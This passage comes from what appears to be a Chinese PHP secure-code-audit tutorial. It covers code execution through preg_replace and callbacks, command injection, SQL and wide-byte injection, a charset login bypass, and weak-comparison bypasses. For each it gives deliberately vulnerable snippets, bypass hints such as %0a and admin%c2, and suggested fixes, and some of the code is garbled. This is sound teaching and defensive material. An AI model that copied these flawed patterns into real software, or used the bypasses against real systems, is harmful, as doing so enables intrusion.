class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/'</span>.$file.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'3.1/default.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-2-preg-replace漏洞"><a href="#3-2-preg-replace漏洞" class="headerlink" title="3.2 preg_replace漏洞"></a>3.2 preg_replace漏洞</h3><h4 id="0x01漏洞背景-7"><a href="#0x01漏洞背景-7" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>preg_replace /e 修正符使 preg_replace() 将 replacement 参数当作 PHP代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法 的 PHP代码字符串，否则 PHP会在报告在包含 preg_replace()的行中出现语法解析错误。</p>
<h4 id="0x02漏洞代码及分析-5"><a href="#0x02漏洞代码及分析-5" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"h"</span>], <span class="string">"jutst test"</span>);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">漏洞代码<span class="number">2</span>：</span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/sphp[/php]s/ies"</span>, <span class="string">'test("\1")'</span>, $_GET[<span class="string">"h"</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>语法不当的情况下，会导致代码执行漏洞<br>修复建议： 避免使用/e模式，第一、二个参数不让用户可控。第二个参数单引号改成双引号<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/sphp[/php]s/ies"</span>, <span class="string">"test('\1')"</span>, $_GET[<span class="string">"h"</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="3-3回调漏洞"><a href="#3-3回调漏洞" class="headerlink" title="3.3回调漏洞"></a>3.3回调漏洞</h3><h4 id="0x01漏洞背景-8"><a href="#0x01漏洞背景-8" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>在PHP一些回调函数中，如果函数输入可控，可以利用回调assert等方法进行命令执行漏洞<br>0x02漏洞代码及分析</p>
<ul>
<li>漏洞代码1：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">call_user_func(_REQUEST[<span class="string">'fun'</span>], _REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">漏洞代码<span class="number">2</span>：</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">array_map(_REQUEST[<span class="string">'fun'</span>], _REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>在fun传递可控的情况下，会引起代码执行漏洞</p>
<ul>
<li>修复建议：</li>
</ul>
<p>第一个参数不让用户可控</p>
<h4 id="建议修复代码："><a href="#建议修复代码：" class="headerlink" title="建议修复代码："></a>建议修复代码：</h4><p>array_map(‘addslashes’, $_REQUEST[‘pass’]);<br>参考文章：<br><a href="https://www.leavesongs.com/penetration/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/php-callback-backdoor.html</a></p>
<h3 id="4-1命令执行漏洞"><a href="#4-1命令执行漏洞" class="headerlink" title="4.1命令执行漏洞"></a>4.1命令执行漏洞</h3><h4 id="0x01漏洞背景-9"><a href="#0x01漏洞背景-9" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>exec、system、shell_exec、passthru等命令执行函数，在传入的命令过滤不严，可导致任意命令执行漏洞，危及服务器。</p>
<h4 id="0x02漏洞代码及分析-6"><a href="#0x02漏洞代码及分析-6" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">url = _GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">content = system(&quot;curl url&quot;);</span><br><span class="line"></span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>直接将可控内容带入命令执行中，导致产生漏洞<br>漏洞代码2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;ip&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    target = trim(_REQUEST[&apos;ip&apos;]);</span><br><span class="line"></span><br><span class="line">    $substitutions = array(</span><br><span class="line"></span><br><span class="line">    &apos;&amp;&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;;&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;|&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;-&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;$&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;(&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;)&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;`&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    &apos;||&apos; = &gt;&apos;&apos;,</span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    target = str_replace(array_keys(substitutions), substitutions, target);</span><br><span class="line">    cmd = shell_exec(&apos;ping -c 4 &apos;.target);</span><br><span class="line"></span><br><span class="line">    echo $target;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>虽然进行了一些过滤，但是过滤不严，%0a可绕过命令执行<br>修复建议：<br>不要让用户可控的内容带入命令执行中<br>参考文章：<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/137923.html</a></p>
<h3 id="5-1普通注入漏洞"><a href="#5-1普通注入漏洞" class="headerlink" title="5.1普通注入漏洞"></a>5.1普通注入漏洞</h3><h4 id="0x01漏洞背景-10"><a href="#0x01漏洞背景-10" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>SQL注入是攻击者通过把恶意SQL命令插入到Web表单的输入域或页面请求的查询字符串中，来达到欺骗服务器执行恶意的SQL命令的一种攻击方式<br>0x02漏洞代码及分析</p>
<ul>
<li>漏洞代码1：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = mysqli - &gt;query(&quot;select content from test where id=$id&quot;);</span><br><span class="line"></span><br><span class="line">if ($data - &gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    arr = data - &gt;fetch_all();</span><br><span class="line"></span><br><span class="line">    foreach(arr as a)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>对于传入的内容未过滤，且SQL拼接的时候没有单引号保护</p>
<h4 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h4><p>使用单引号保护并过滤内容<br>建议修复代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">漏洞代码2：</span><br><span class="line"></span><br><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? $GET[&apos;id&apos;] : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">data = mysqli - &gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if ($data - &gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    arr = data - &gt;fetch_all();</span><br><span class="line"></span><br><span class="line">    foreach(arr as a)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>即使使用了单引号保护，但是传入内容未过滤，导致SQL注入<br>修复建议：<br>参考代码1修复</p>
<ul>
<li>漏洞代码3：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;); //数据库连接</span><br><span class="line">if (!empty($_POST[&apos;content&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    name = _POST[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">    content = _POST[&apos;content&apos;];</span><br><span class="line"></span><br><span class="line">    if (mysqli - &gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;发言成功&apos;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &apos;发言失败&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>insert型注入，差不多的注入方式。<br>修复建议： 对SQL拼接时一定要单引号保护，整数型也不例外，并且传入的值要经过addslashes函数过滤。不过最好的方案还是用PDO预处理修复代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = addslashes(_POST[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">content = addslashes(_POST[&apos;content&apos;]);</span><br><span class="line"></span><br><span class="line">if(mysqli-&gt;query(&quot;insert into test (content)values(&apos;name&apos;,&apos;$content&apos;)&quot;))</span><br></pre></td></tr></table></figure>
<h3 id="5-2宽字节注入漏洞"><a href="#5-2宽字节注入漏洞" class="headerlink" title="5.2宽字节注入漏洞"></a>5.2宽字节注入漏洞</h3><h4 id="0x01漏洞背景-11"><a href="#0x01漏洞背景-11" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用charactersetclient设置值进行了一次编码</p>
<h4 id="0x02漏洞代码及分析-7"><a href="#0x02漏洞代码及分析-7" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接</span><br><span class="line"></span><br><span class="line">id = !empty(GET[&apos;id&apos;]) ? addslashes($GET[&apos;id&apos;]) : &apos;1&apos;;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(&quot;SET NAMES &apos;gbk&apos;&quot;);</span><br><span class="line"></span><br><span class="line">data = mysqli-&gt;query(&quot;select content from test where id=&apos;$id&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if($data-&gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">arr = data-&gt;fetch_all();</span><br><span class="line"></span><br><span class="line">foreach(arr as a)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">echo &apos;内容：&apos;.$a[0].&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行SET NAMES ‘gbk’之后会引起宽字节注入漏洞，绕过单引号达到注入效果<br>修复建议：<br>字符集编码设置成utf8<br>建议修复代码：<br>$mysqli-&gt;query(“SET NAMES ‘utf8’”);</p>
<h3 id="5-3字符集漏洞"><a href="#5-3字符集漏洞" class="headerlink" title="5.3字符集漏洞"></a>5.3字符集漏洞</h3><h4 id="0x01漏洞背景-12"><a href="#0x01漏洞背景-12" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>默认情况下，Mysql的字符集就是latin1，Mysql字段的字符集和php mysqli客户端设置的字符集不相同导致可能绕过登录等情况<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;code&apos;);//数据库连接</span><br><span class="line"></span><br><span class="line">if(!empty(_POST[&apos;username&apos;]) &amp;&amp; !empty(_POST[&apos;password&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">username = addslashes(_POST[&apos;username&apos;]);</span><br><span class="line"></span><br><span class="line">password = addslashes(_POST[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">data = mysqli-&gt;query(&quot;select * from user where username=&apos;username&apos; and password=&apos;password&apos;&quot;);</span><br><span class="line"></span><br><span class="line">if($data-&gt;num_rows !== &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">arr = data-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">_SESSION[&apos;username&apos;] = arr[1];</span><br><span class="line"></span><br><span class="line">echo &apos;登录成功&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>例如管理员账号是admin，注册admin%c2，登录之后就是管理员权限了<br>修复建议：<br>将数据库字符集修改为utf8<br>参考文章：<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p>
<h3 id="6-1-hash比较绕过"><a href="#6-1-hash比较绕过" class="headerlink" title="6.1 hash比较绕过"></a>6.1 hash比较绕过</h3><h4 id="0x01漏洞背景-13"><a href="#0x01漏洞背景-13" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br>0x02漏洞代码及分析<br>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset(_GET[&apos;Username&apos;]) &amp;&amp; isset(_GET[&apos;password&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    $logined = true;</span><br><span class="line"></span><br><span class="line">    Username = _GET[&apos;Username&apos;];</span><br><span class="line"></span><br><span class="line">    password = _GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    if (!ctype_alpha($Username)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!is_numeric($password)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (md5(Username) != md5(password)) &#123;</span><br><span class="line"></span><br><span class="line">        $logined = false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($logined) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;successful&quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;login failed!&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。导致弱类型比较绕过<br>修复建议： 将 ==换成 ===<br>建议修复代码：<br>if (md5($Username) !== md5($password)) {</p>
<h3 id="6-2-json绕过"><a href="#6-2-json绕过" class="headerlink" title="6.2 json绕过"></a>6.2 json绕过</h3><h4 id="0x01漏洞背景-14"><a href="#0x01漏洞背景-14" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-8"><a href="#0x02漏洞代码及分析-8" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;message&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    message = json_decode(_POST[&apos;message&apos;]);</span><br><span class="line"></span><br><span class="line">    $key = &quot;*****&quot;;</span><br><span class="line"></span><br><span class="line">    if (message - &gt;key == key) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;~~~~&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>json_decode之后可以解析成布尔型，可以传入true绕过比较<br>修复建议：<br>将 ==换成 ===<br>建议修复代码：<br>if ($message-&gt;key === $key) {</p>
<h3 id="6-3-array-search绕过"><a href="#6-3-array-search绕过" class="headerlink" title="6.3 array_search绕过"></a>6.3 array_search绕过</h3><h4 id="0x01漏洞背景-15"><a href="#0x01漏洞背景-15" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>==在进行比较的时候，会先将字符串类型转化成相同，再比较<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<h4 id="0x02漏洞代码及分析-9"><a href="#0x02漏洞代码及分析-9" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">if (!is_array($_GET[&apos;test&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test = _GET[&apos;test&apos;];</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; count(test); i++) &#123;</span><br><span class="line"></span><br><span class="line">    if (test[i] === &quot;admin&quot;) &#123;</span><br><span class="line"></span><br><span class="line">        echo &quot;error&quot;;</span><br><span class="line"></span><br><span class="line">        exit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    test[i] = intval(test[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (array_search(&quot;admin&quot;, $test) === 0) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;false&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span 